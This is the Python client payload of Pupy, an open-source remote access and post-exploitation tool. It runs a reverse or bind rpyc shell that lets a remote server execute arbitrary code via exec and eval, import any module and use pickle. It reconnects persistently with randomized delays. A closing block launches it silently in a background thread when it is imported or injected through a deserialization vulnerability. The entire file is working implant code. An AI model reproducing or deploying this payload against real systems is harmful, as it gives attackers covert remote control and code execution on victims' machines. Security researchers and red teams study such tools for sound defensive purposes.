#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ---------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice,
# this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice,
# this list of conditions and the following disclaimer in the documentation
# and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors
# may be used to endorse or promote products derived from this software without
# specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE
# ---------------------------------------------------------------

import site
import sys
import time
import rpyc
from rpyc.core.service import Service, ModuleNamespace
from rpyc.lib.compat import execute, is_py3k
import rpyc.core.stream
import rpyc.utils.factory
import threading
import weakref
import traceback
import os
import subprocess
import threading
import StringIO
import json
import urllib2
import urllib
import platform
import re
import ssl
import random
import imp
import json
import argparse
from network import conf
from network.lib.base_launcher import LauncherError
from network.lib.connection import PupyConnection
import logging
import shlex
import marshal

try:
    # additional imports needed to package with pyinstaller
    import additional_imports

except ImportError:
    pass

except Exception as e:
    logging.warning(e)

logging.getLogger().setLevel(logging.WARNING)

try:
    import pupy
except ImportError, e:
    print 'Couldnt load pupy: {}'.format(e)
    mod = imp.new_module("pupy")
    mod.__name__ = "pupy"
    mod.__file__ = "<memimport>\\\\pupy"
    mod.__package__ = "pupy"
    sys.modules["pupy"] = mod
    mod.pseudo = True

    import pupy

pupy.infos = {}  # global dictionary to store informations persistent through a deconnection

def safe_obtain(proxy):
    """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """
    if type(proxy) in [list, str, bytes, dict, set, type(None)]:
        return proxy
    conn = object.__getattribute__(proxy, "____conn__")()
    return json.loads(conn.root.json_dumps(proxy)) # should prevent any code execution

def obtain(proxy):
    """ allows to convert netref types into python native types """
    return safe_obtain(proxy)

setattr(pupy, 'obtain', obtain) # I don't see a better spot to put this util

LAUNCHER = "connect"  # the default launcher to start when no argv
# default launcher arguments
LAUNCHER_ARGS = shlex.split("--host 127.0.0.1:443 --transport ssl")

REVERSE_SLAVE_CONF = dict(
    allow_all_attrs=True,
    allow_public_attrs=True,
    allow_pickle=True,
    allow_getattr=True,
    allow_setattr=True,
    allow_delattr=True,
    import_custom_exceptions=False,
    propagate_SystemExit_locally=True,
    propagate_KeyboardInterrupt_locally=True,
    instantiate_custom_exceptions=True,
    instantiate_oldstyle_exceptions=True,
)

class UpdatableModuleNamespace(ModuleNamespace):
    __slots__ = ['__invalidate__']

    def __invalidate__(self, name):
        cache = self._ModuleNamespace__cache
        if name in cache:
            del cache[name]

class ReverseSlaveService(Service):
    """ Pupy reverse shell rpyc service """
    __slots__ = ["exposed_namespace", "exposed_cleanups"]

    def on_connect(self):
        self.exposed_namespace = {}
        self.exposed_cleanups = []
        self._conn._config.update(REVERSE_SLAVE_CONF)
        self._conn.root.set_modules(
            UpdatableModuleNamespace(self.exposed_getmodule))

    def on_disconnect(self):
        print "disconnecting !"
        for cleanup in self.exposed_cleanups:
            try:
                cleanup()
            except Exception as e:
                logging.exception(e)

        self.exposed_cleanups = []

        try:
            self._conn.close()
        except Exception as e:
            logging.exception(e)
            raise

        try:
            while True:
                os.waitpid(-1, os.WNOHANG)
        except OSError:
            pass


    def exposed_exit(self):
        try:
            return True
        finally:
            os._exit(0)

    def exposed_register_cleanup(self, method):
        self.exposed_cleanups.append(method)

    def exposed_unregister_cleanup(self, method):
        self.exposed_cleanups.remove(method)

    def exposed_execute(self, text):
        """execute arbitrary code (using ``exec``)"""
        execute(text, self.exposed_namespace)

    def exposed_get_infos(self, s):
        import pupy
        if s not in pupy.infos:
            return None
        return pupy.infos[s]

    def exposed_eval(self, text):
        """evaluate arbitrary code (using ``eval``)"""
        return eval(text, self.exposed_namespace)

    def exposed_getmodule(self, name):
        """imports an arbitrary module"""
        return __import__(name, None, None, "*")

    def exposed_json_dumps(self, obj):
        return json.dumps(obj)

    def exposed_getconn(self):
        """returns the local connection instance to the other side"""
        return self._conn


class BindSlaveService(ReverseSlaveService):

    def on_connect(self):
        self.exposed_namespace = {}
        self.exposed_cleanups = []
        self._conn._config.update(REVERSE_SLAVE_CONF)
        import pupy
        try:
            from pupy_credentials import BIND_PAYLOADS_PASSWORD
            password = BIND_PAYLOADS_PASSWORD
        except:
            from pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            password = credentials['BIND_PAYLOADS_PASSWORD']

        if self._conn.root.get_password() != password:
            self._conn.close()
            raise KeyboardInterrupt("wrong password")

        self._conn.root.set_modules(
            UpdatableModuleNamespace(self.exposed_getmodule))


def get_next_wait(attempt):
    if attempt < 120:
        return random.randint(5, 10) / 10.0
    elif attempt < 320:
        return random.randint(30, 50) / 10.0
    else:
        return random.randint(150, 300) / 10.0


def set_connect_back_host(HOST):
    import pupy
    pupy.get_connect_back_host = (lambda: HOST)

def handle_sigchld(*args, **kwargs):
    os.waitpid(-1, os.WNOHANG)

attempt = 0
debug = False

def main():
    global LAUNCHER
    global LAUNCHER_ARGS
    global debug
    global attempt

    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(
            prog='pp.py',
            formatter_class=argparse.RawTextHelpFormatter,
            description="Starts a reverse connection to a Pupy server using the selected launcher\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")
        parser.add_argument(
            '--debug',
            action='store_true',
            help="increase verbosity")
        parser.add_argument(
            'launcher',
            choices=[
                x for x in conf.launchers],
            help="the launcher to use")
        parser.add_argument(
            'launcher_args',
            nargs=argparse.REMAINDER,
            help="launcher arguments")
        args = parser.parse_args()
        if args.debug:
            logging.getLogger().setLevel(logging.DEBUG)
        debug = bool(args.debug)
        LAUNCHER = args.launcher
        LAUNCHER_ARGS = shlex.split(' '.join(args.launcher_args))

    if LAUNCHER not in conf.launchers:
        exit("No such launcher: %s" % LAUNCHER)

    if hasattr(pupy, 'get_pupy_config'):
        try:
            config_file = pupy.get_pupy_config()
            exec config_file in globals()
        except ImportError, e:
            logging.warning(
                "ImportError: Couldn't load pupy config: {}".format(e))

    launcher = conf.launchers[LAUNCHER]()
    try:
        launcher.parse_args(LAUNCHER_ARGS)
    except LauncherError as e:
        launcher.arg_parser.print_usage()
        exit(str(e))
    if getattr(pupy, 'pseudo', False):
        set_connect_back_host(launcher.get_host())
    else:
        pupy.get_connect_back_host = launcher.get_host

    pupy.infos['launcher'] = LAUNCHER
    pupy.infos['launcher_args'] = LAUNCHER_ARGS
    pupy.infos['launcher_inst'] = launcher
    pupy.infos['transport'] = launcher.get_transport()
    pupy.infos['native'] = not getattr(pupy, 'pseudo', False)

    exited = False

    while not exited:
        try:
            rpyc_loop(launcher)

        except Exception as e:
            if type(e) == SystemExit:
                exited = True

            if debug:
                try:
                    logging.exception(e)
                except:
                    print "Exception ({}): {}".format(type(e), e)

        finally:
            if not exited:
                time.sleep(get_next_wait(attempt))
                attempt += 1


def rpyc_loop(launcher):
    global attempt
    global debug

    for ret in launcher.iterate():
        try:
            if isinstance(ret, tuple):  # bind payload
                server_class, port, address, authenticator, stream, transport, transport_kwargs = ret
                s = server_class(
                    BindSlaveService,
                    port=port,
                    hostname=address,
                    authenticator=authenticator,
                    stream=stream,
                    transport=transport,
                    transport_kwargs=transport_kwargs,
                    pupy_srv=None,
                )
                s.start()

            else:  # connect payload
                stream = ret

                def check_timeout(event, cb, timeout=60):
                    time.sleep(timeout)
                    if not event.is_set():
                        logging.error('timeout occured!')
                        cb()

                event = threading.Event()
                t = threading.Thread(
                    target=check_timeout, args=(
                        event, stream.close))
                t.daemon = True
                t.start()

                lock = threading.RLock()
                conn = None

                try:
                    conn = PupyConnection(
                        lock, None, ReverseSlaveService,
                        rpyc.Channel(stream), config={}
                    )
                    conn._init_service()
                finally:
                    event.set()

                attempt = 0
                with lock:
                    while not conn.closed:
                        conn.serve(10)

        except SystemExit:
            raise

        except EOFError:
            pass

        except Exception as e:
            if debug:
                try:
                    logging.exception(e)
                except:
                    print "Exception ({}): {}".format(type(e), e)

if __name__ == "__main__":
    main()
else:
    is_android = False

    try:
        from kivy.utils import platform as kivy_plat
        if kivy_plat=="android":
            is_android=True
    except:
        pass

    if not is_android:
        t=threading.Thread(target=main) # to allow pupy to run in background when imported or injected through a python application exec/deserialization vulnerability
        t.daemon=True
        t.start()
